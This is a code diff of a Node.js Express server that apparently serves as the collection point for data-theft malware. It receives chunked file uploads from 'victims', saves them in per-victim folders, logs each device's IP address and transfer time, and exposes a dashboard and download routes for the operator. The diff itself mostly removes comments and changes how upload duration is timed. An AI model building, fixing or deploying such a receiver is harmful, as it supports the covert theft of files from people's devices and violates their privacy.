@@ -5,7 +5,7 @@ const express = require('express');
 const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically
+const PORT = process.env.PORT || 8080;
 
 // Enable CORS with specific options
 const corsOptions = {
@@ -31,17 +31,14 @@ app.options('/upload', (req, res) => {
   res.status(204).end();
 });
 
-// Serve the dashboard as static files
+// Serve dashboard
 app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
-
 app.get('/dashboard/', (req, res) => {
   res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
 });
 
-// Middleware to handle raw binary data for file uploads
 app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));
 
-// Base directory for storing files
 const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
 if (!fs.existsSync(OUTPUT_BASE_DIR)) {
   fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
@@ -52,11 +49,8 @@ const victimFileCounts = {};
 const victimTotalFiles = {};
 const victimFiles = {};
 const connectedDevices = {};
-
-// Track received chunks
 const chunkTracker = new Map();
 
-// Function to check if all files are received and calculate time
 async function checkAndSendEmail(victimId, victimFolder) {
   const filesInFolder = fs.readdirSync(victimFolder);
   if (filesInFolder.length === victimTotalFiles[victimId]) {
@@ -70,14 +64,16 @@ async function checkAndSendEmail(victimId, victimFolder) {
 
     victimFiles[victimId] = files;
 
-    // ✅ FIX: Calculate total transfer time from first chunk received
-    const timeTaken = Date.now() - connectedDevices[victimId].firstChunkTime;
-    connectedDevices[victimId].totalUploadTime = timeTaken;  // Store the actual transfer time in ms
-    console.log(`Time to receive all files for ${victimId}: ${timeTaken / 1000} seconds`);
+    if (connectedDevices[victimId].startTime) {
+      const uploadDurationMs = Date.now() - connectedDevices[victimId].startTime;
+      connectedDevices[victimId].totalUploadTime = uploadDurationMs / 1000; // Convert to seconds
+      console.log(`⏱️ Total upload time for ${victimId}: ${connectedDevices[victimId].totalUploadTime.toFixed(2)} seconds`);
+    } else {
+      console.warn(`⚠️ No startTime recorded for ${victimId}, cannot calculate upload time.`);
+    }
   }
 }
 
-// Route to handle file uploads
 app.post('/upload', (req, res) => {
   try {
     const filename = decodeURIComponent(req.headers['filename']);
@@ -91,33 +87,24 @@ app.post('/upload', (req, res) => {
     }
 
     const chunkId = `${victimId}-${filename}-${chunkIndex}`;
-
-    // Initialize chunk tracking for each file
-    if (!chunkTracker.has(chunkId)) {
-      chunkTracker.set(chunkId, new Set());
-    }
-
+    if (!chunkTracker.has(chunkId)) chunkTracker.set(chunkId, new Set());
     if (chunkTracker.get(chunkId).has(chunkIndex)) {
       console.log(`⏭️ Skipping duplicate chunk: ${chunkId}`);
       return res.status(200).json({ message: 'Duplicate chunk skipped' });
     }
-
     chunkTracker.get(chunkId).add(chunkIndex);
 
     if (!connectedDevices[victimId]) {
       connectedDevices[victimId] = {
         ip: ip,
-        connectionTime: Date.now(),  // Record connection time in milliseconds
-        lastConnectionTime: new Date(),
-        firstChunkTime: null,  // ✅ FIX: Track first chunk received time
+        connectionTime: new Date(),
         filesTransferred: 0,
         fileList: [],
+        startTime: Date.now(), // This is the correct start time for uploads
+        totalUploadTime: 0,
       };
-    }
-
-    // ✅ FIX: Record the time of the first received chunk
-    if (!connectedDevices[victimId].firstChunkTime) {
-      connectedDevices[victimId].firstChunkTime = Date.now();
+    } else {
+      connectedDevices[victimId].lastConnectionTime = new Date();
     }
 
     if (!victimFolders[victimId]) {
@@ -126,6 +113,9 @@ app.post('/upload', (req, res) => {
       fs.mkdirSync(victimFolders[victimId], { recursive: true });
       victimFileCounts[victimId] = 0;
       victimTotalFiles[victimId] = totalChunks;
+
+      // Only reset startTime if it's the very first file from this victim
+      connectedDevices[victimId].startTime = Date.now();
     }
 
     const victimFolder = victimFolders[victimId];
@@ -137,7 +127,7 @@ app.post('/upload', (req, res) => {
         return res.status(500).json({ error: 'Error saving file' });
       }
 
-      console.log(`✅ Chunk ${chunkIndex + 1} of ${totalChunks} received for file: ${filename}`);
+      console.log(`✅ Chunk ${chunkIndex + 1}/${totalChunks} received for file: ${filename}`);
       victimFileCounts[victimId] += 1;
       connectedDevices[victimId].filesTransferred += 1;
 
@@ -158,12 +148,10 @@ app.post('/upload', (req, res) => {
   }
 });
 
-// Route to provide dashboard data
 app.get('/dashboard-data', (req, res) => {
   res.json(connectedDevices);
 });
 
-// Route to download files
 app.get('/download/:victimId/:filename', (req, res) => {
   try {
     const { victimId, filename } = req.params;
@@ -191,7 +179,6 @@ app.get('/download/:victimId/:filename', (req, res) => {
   }
 });
 
-// Start the server
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
 });
